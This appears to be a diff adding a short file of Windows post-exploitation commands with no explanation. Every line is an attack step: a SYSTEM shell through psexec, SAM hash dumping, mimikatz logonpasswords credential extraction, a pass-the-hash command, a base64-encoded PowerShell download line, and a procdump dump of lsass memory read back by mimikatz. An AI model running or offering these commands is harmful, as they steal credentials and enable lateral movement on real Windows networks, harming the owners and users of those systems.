@@ -1,0 +1,14 @@
+psexec -s -i -d cmd.exe
+CQHashDumpV2 /samdump
+mimikatz # privilege::debug
+mimikatz # log nameoflog.log
+mimikatz # sekurlsa::logonpasswords
+mimikatz # sekurlsa::pth /user:akdamin /domain:localhost /ntlm:
+Whoami
+Hostname
+$tool=”Invoke-WebRequest -OutFile c:\temp\pd.exe”
+$base64=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($tool))
+$base64
+\procdump.exe -accepteula -ma lsass.exe
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonpasswords
